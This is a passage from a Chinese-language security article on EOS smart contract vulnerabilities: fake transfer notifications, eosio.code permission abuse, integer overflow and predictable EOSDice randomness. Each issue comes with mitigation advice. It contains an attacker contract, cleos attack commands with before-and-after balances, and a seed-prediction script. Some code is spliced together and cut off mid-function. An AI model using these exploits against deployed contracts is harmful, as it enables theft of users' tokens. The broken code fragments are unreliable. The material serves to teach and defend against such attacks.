          [[eosio::action]]
          void attack( name to, asset value, string memo ) {
             action(
                   permission_level{ _self,name("active")},
                   name("eosdiceadmin"),
                   name("transfer"),
                   std::make_tuple(_self,to,value,memo)
             ).send();
          }
    };
    EOSIO_DISPATCH( call, (attack))
攻击者部署合约，合约里发送 inline action。关键点是设置 name("eosdiceadmin"), 以满足校验条件。
攻击前查看余额
    Adas-Macbook-Pro:calltransfer ada$ cleos get currency balance eosio.token alice
    290.0000 ADA
    1001.0674 BOB
    10065.0000 SYS
进行转账攻击
    Adas-Macbook-Pro:calltransfer ada$ cleos push action alice attack '["eosdiceadmin", "100.0000 BOB", "dice-50-eosdiceadmin"]' -p alice
    executed transaction: 515affd83784559dfb3e92edd3d22edc669243cd634411001b020e5787d4c959  144 bytes  2026 us
    。。。
攻击后查看余额，可以看到攻击者 alice 调用敏感接口成功。获得了 1202.0878 BOB - 1001.0674 BOB = 201.0204
BOB 币。
    Adas-Macbook-Pro:calltransfer ada$ cleos get currency balance eosio.token alice
    290.0000 ADA
    1202.0878 BOB
    10065.0000 SYS
##### 规避建议
绑定每个 code 和 action，如 transfer 只能对应 eosio.token 。
    extern "C"
    {
        void apply(uint64_t receiver, uint64_t code, uint64_t action)
    {
            if ((code == name("eosio.token").value) && (action == name("transfer").value))
            {
                execute_action(name(receiver),name("eosdiceadmin"), &eosbocai2222::transfer);
                return;
            }
            if (code != receiver)
                return;
            switch (action)
            {
                EOSIO_DISPATCH_HELPER(eosbocai2222, (reveal)(init))
            };
            //eosio_exit(0);
        }
    }
#### 合约滥用用户权限 — eosio.code 权限
eosio.code 权限是 dawn4.0 后新增的内部特殊权限，用来加强 inline action 的安全性。inline action
简单来说就是action 调用另外一个 action，具体来说就是一个智能合约调用另外一个智能合约。inline action 需要向用户申请
eosio.code 权限。用户只有授权 eosio.code 权限给合约之后，合约才可以以用户身份调用另一个合约。
##### 漏洞介绍
若用户错误的把自身的 active 权限授予其他合约的 eosio.code 权限，其他合约就可以以用户的身份执行一些敏感操作，如转账操作。
##### 漏洞示例
Fomo 3D 狼人游戏就是一个申请用户 active 权限的游戏。用户授予合约账号 active
权限之后，合约可以自主升级，合约升级为恶意版本之后。合约账号就可以以用户的身份执行敏感操作。但是真实世界中，Fomo 3D
的项目方并没有作恶，而是让用户收回权限。
##### 攻击示例
任何申请用户 active 权限的场景。由于合约可以升级，即使授权版本的合约经过审计，也无法保证后续升级合约不作恶。所以任何申请用户 active
权限的场景都会存在威胁。
##### 规避建议
用户不得把 active 权限授权给不信任的合约。
### 整数溢出
整数溢出的问题是最为常见的安全问题。[智能合约安全系列——百万合约之母以太坊的漏洞攻防术（下集）](https://paper.seebug.org/1545/
"智能合约安全系列——百万合约之母以太坊的漏洞攻防术（下集）")已经介绍了整数溢出的几种形式。
本文主要分享一下 EOS 平台的案例。EOS 合约使用 C 语言编写，整数溢出在 C 语言里非常常见。
##### 漏洞介绍
整数溢出发生的原因是因为寄存器能表示的数值位数有限，当存储的数值大于能表示的最大范围后，数值发生溢出，或称为反转。最大值溢出会变成最小值，最小值溢出为变成最大值。
    void token::transfer( const name&    from,
                          const name&    to,
                          const asset&   quantity,
                          const string&  memo )
    {
        name to2 = to; //模拟batchtransfer
        check( from != to, "cannot transfer to self" );
        auto sym = quantity.symbol.code();
        stats statstable( get_self(), sym.raw() );
        const auto& st = statstable.get( sym.raw() );
        check( quantity.is_valid(), "invalid quantity" );
        check( quantity.amount > 0, "must transfer positive quantity" );
        check( quantity.symbol == st.supply.symbol, "symbol precision mismatch" );
        check( memo.size() (&mixd);
        checksum256 result;
        sha256((char *)mixedChar, sizeof(mixedChar), &result);
        uint64_t random_num = *(uint64_t *)(&result.hash[0]) + *(uint64_t *)(&result.hash[8]) + *(uint64_t *)(&result.hash[16]) + *(uint64_t *)(&result.hash[24]);
        return (uint8_t)(random_num % 100 + 1);
    }
可以看到，EOSDice 官方的随机数算法为 6 个随机数种子进行数学运算，再哈希，最后再进行一次数学运算。EOSDice 官方选择的随机数种子为：
  * tapos_block_prefix # ref block 的信息
  * tapos_block_num # ref block 的信息
  * account_name # 玩家的名字
  * game_id # 本次游戏的游戏 id，从 1 自增
  * current_time # 当前开奖的时间戳
  * pool_eos # 本合约的 EOS 余额
具体种子在第一篇文章[智能合约漏洞系列 -- 运行平台科普篇](https://paper.seebug.org/1546/ "智能合约漏洞系列 --运行平台科普篇")EOS 交易结构的时候已经解释过意义，结论就是这些因素都可以被预测。
##### 攻击示例
random.cpp 主要是计算随机数。
以下脚本负责计算种子值：
    import requests
    import json
    import os
    import binascii
    import struct
    import sys
    game_id = sys.argv[1]
    # get tapos block num
    url = "http://127.0.0.1:8888/v1/chain/get_info"
    response = requests.request("POST", url)
    res = json.loads(response.text)
    last_block_num = res["head_block_num"]
    # get tapos block id
    url = "http://127.0.0.1:8888/v1/chain/get_block"
    data = {"block_num_or_id":last_block_num}
    response = requests.post(url, data=json.dumps(data))
    res = json.loads(response.text)
    last_block_hash = res["id"]
    # get tapos block prefix
    block_prefix = struct.unpack("
* * *